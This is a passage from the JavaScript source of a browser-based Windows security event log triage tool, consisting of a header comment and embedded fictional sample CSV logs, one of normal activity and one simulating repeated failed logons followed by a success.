/* =========================================================================
   WinEvent Triage — Windows Security Event Log Triage Tool
   -------------------------------------------------------------------------
   Runs entirely in the browser. Nothing is uploaded, transmitted or stored.
   No frameworks, no dependencies, no network requests.

   Contents:
     1.  Embedded demo datasets (fictional, safe)
     2.  Windows Event ID catalogue (plain-English meanings)
     3.  Small DOM + text helpers (safe rendering, no untrusted innerHTML)
     4.  CSV parser (quote-aware, tolerant of Windows export quirks)
     5.  Column detection (handles many header naming variations)
     6.  Message parsing (pulls account / source IP / group from Message text)
     7.  Timestamp parsing (several Windows/locale formats)
     8.  Event normalisation
     9.  Detection + correlation rules (explainable, rule-based)
    10.  Investigation score (fully itemised)
    11.  Rendering (dashboard, findings, charts, timeline, table)
    12.  Filters, search and UI wiring
   ========================================================================= */
(function () {
  'use strict';

  /* ---------------------------------------------------------------------
     1. Embedded demo datasets.
     Identical copies of the files in /samples. They are embedded so the
     "Load ... Sample" buttons also work when index.html is opened directly
     from disk (file://), where browsers block reading local files.
     --------------------------------------------------------------------- */
  const SAMPLE_CSV = {
  "normal-windows-events.csv": "Level,Date and Time,Source,Event ID,Task Category,User,Computer,Keywords,Message\r\nInformation,14/10/2026 08:00:02,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\jsmith,WS-FIN-014,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-FIN-014$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-FIN-014\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 08:00:05,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\jsmith,WS-FIN-014,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Windows\\explorer.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\System32\\userinit.exe\n\tProcess Command Line:\t\"\"C:\\Windows\\explorer.exe\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 08:00:19,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\jsmith,WS-FIN-014,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 08:02:41,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\apatel,WS-HR-007,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-HR-007$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tapatel\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-HR-007\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 08:02:44,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\apatel,WS-HR-007,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tapatel\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 08:05:10,Microsoft-Windows-Security-Auditing,4624,Logon,NT AUTHORITY\\SYSTEM,SRV-FILE-01,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tSRV-FILE-01$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t5\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tSRV-FILE-01$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\n\nNetwork Information:\n\tWorkstation Name:\tSRV-FILE-01\n\tSource Network Address:\t::1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 08:05:12,Microsoft-Windows-Security-Auditing,4624,Logon,NT AUTHORITY\\SYSTEM,SRV-FILE-01,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-HR-007$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tSRV-FILE-01$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\lsass.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-HR-007\n\tSource Network Address:\t10.20.0.31\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 08:12:33,Microsoft-Windows-Security-Auditing,4634,Logoff,CORP\\jsmith,WS-FIN-014,,\"An account was logged off.\n\nSubject:\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nLogon Type:\t\t\t2\"\r\nInformation,14/10/2026 08:31:07,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\jsmith,WS-FIN-014,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-FIN-014$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-FIN-014\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 08:31:40,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,WS-FIN-014,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t2\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tWS-FIN-014\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t49813\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 08:31:52,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\jsmith,WS-FIN-014,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-FIN-014$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-FIN-014\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 09:04:15,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\jsmith,WS-FIN-014,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Program Files\\Microsoft 365\\WINWORD.EXE\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Program Files\\Microsoft 365\\WINWORD.EXE\"\" \"\"\\\\SRV-FILE-01\\Share\\Q4-plan.docx\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 09:22:58,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\apatel,WS-HR-007,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tapatel\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Windows\\System32\\notepad.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Windows\\System32\\notepad.exe\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 10:15:02,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\rjones,SRV-FILE-01,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-IT-002$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\trjones\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\lsass.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-IT-002\n\tSource Network Address:\t10.20.0.44\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 11:47:31,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\jsmith,WS-FIN-014,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-FIN-014$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-FIN-014\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 13:02:09,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\jsmith,WS-FIN-014,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Windows\\System32\\mspaint.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Windows\\System32\\mspaint.exe\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 15:30:44,Microsoft-Windows-Security-Auditing,4634,Logoff,CORP\\apatel,WS-HR-007,,\"An account was logged off.\n\nSubject:\n\tAccount Name:\t\tapatel\n\tAccount Domain:\t\tCORP\n\nLogon Type:\t\t\t2\"\r\nInformation,14/10/2026 16:05:00,Microsoft-Windows-Security-Auditing,4624,Logon,NT AUTHORITY\\SYSTEM,SRV-FILE-01,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tSRV-FILE-01$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t5\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tSRV-FILE-01$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\n\nNetwork Information:\n\tWorkstation Name:\tSRV-FILE-01\n\tSource Network Address:\t::1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\n",
  "password-guessing.csv": "Level,Date and Time,Source,Event ID,Task Category,User,Computer,Keywords,Message\r\nInformation,14/10/2026 02:14:01,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\svc_backup,SRV-FILE-01,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tSRV-FILE-01$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t5\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\n\nNetwork Information:\n\tWorkstation Name:\tSRV-FILE-01\n\tSource Network Address:\t::1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 02:41:02,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t49889\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 02:41:05,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t49889\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 02:41:09,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t49889\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 02:41:14,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t49889\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 02:41:20,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t49889\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 02:41:27,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t49889\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 02:41:35,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t49889\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 02:41:44,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t49889\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 02:41:58,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\jsmith,SRV-FILE-01,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tKALI-LAB$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\lsass.exe\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t198.51.100.77\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 03:10:22,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\apatel,WS-HR-007,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-HR-007$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tapatel\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-HR-007\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 07:58:12,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\rjones,WS-IT-002,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-IT-002$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\trjones\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-IT-002\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 07:58:30,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\rjones,WS-IT-002,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity 